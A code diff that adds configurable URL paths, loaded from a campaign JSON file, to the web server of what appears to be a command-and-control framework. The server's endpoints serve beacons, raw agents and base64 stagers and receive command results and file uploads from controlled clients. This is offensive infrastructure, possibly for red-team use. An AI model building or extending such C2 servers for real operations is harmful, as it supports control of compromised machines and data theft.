@@ -2,6 +2,7 @@ import socketserver
 import threading
 import os
 import ssl
+import json
 from core.key_manager import KeyManager
 from core.crypto_utils import CryptoManager
 from core.utils.client_identity import ClientVerifier
@@ -14,7 +15,7 @@ class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 # Global variable to hold the server instance
 httpd = None
 
-def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ssl=False, cert_path=None, key_path=None):
+def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ssl=False, cert_path=None, key_path=None, url_paths=None):
     """Starts the web server in a separate thread."""
     global httpd
     try:
@@ -34,13 +35,41 @@ def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ss
         # Create client verifier for this campaign
         client_verifier = ClientVerifier(campaign_folder)
         
+        # Load URL paths from file if not provided
+        if url_paths is None:
+            url_paths_file = os.path.join(campaign_folder, "url_paths.json")
+            if os.path.exists(url_paths_file):
+                try:
+                    with open(url_paths_file, 'r') as f:
+                        url_paths = json.load(f)
+                    logger(f"Loaded custom URL paths from {url_paths_file}")
+                except Exception as e:
+                    logger(f"Error loading URL paths: {e}")
+                    url_paths = {
+                        "beacon_path": "/beacon",
+                        "agent_path": "/raw_agent",
+                        "stager_path": "/b64_stager",
+                        "cmd_result_path": "/command_result",
+                        "file_upload_path": "/file_upload"
+                    }
+            else:
+                # Default URL paths
+                url_paths = {
+                    "beacon_path": "/beacon",
+                    "agent_path": "/raw_agent",
+                    "stager_path": "/b64_stager",
+                    "cmd_result_path": "/command_result",
+                    "file_upload_path": "/file_upload"
+                }
+        
         # Set up the server with the handler
         handler = lambda *args: C2RequestHandler(
             *args, 
             client_manager=client_manager, 
             logger=logger, 
             crypto_manager=crypto_manager, 
-            campaign_name=campaign_name
+            campaign_name=campaign_name,
+            url_paths=url_paths
         )
         
         # Create server
@@ -75,6 +104,7 @@ def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ss
         protocol = "https" if use_ssl and cert_path and key_path else "http"
         logger(f"Webserver started at {protocol}://{ip}:{port} for campaign '{campaign_name}'")
         logger(f"All traffic will be encrypted using AES-256-CBC with pre-shared keys")
+        logger(f"Using custom URL paths: {url_paths}")
         
         # Create necessary campaign directories
         os.makedirs(os.path.join(campaign_folder, "uploads"), exist_ok=True)
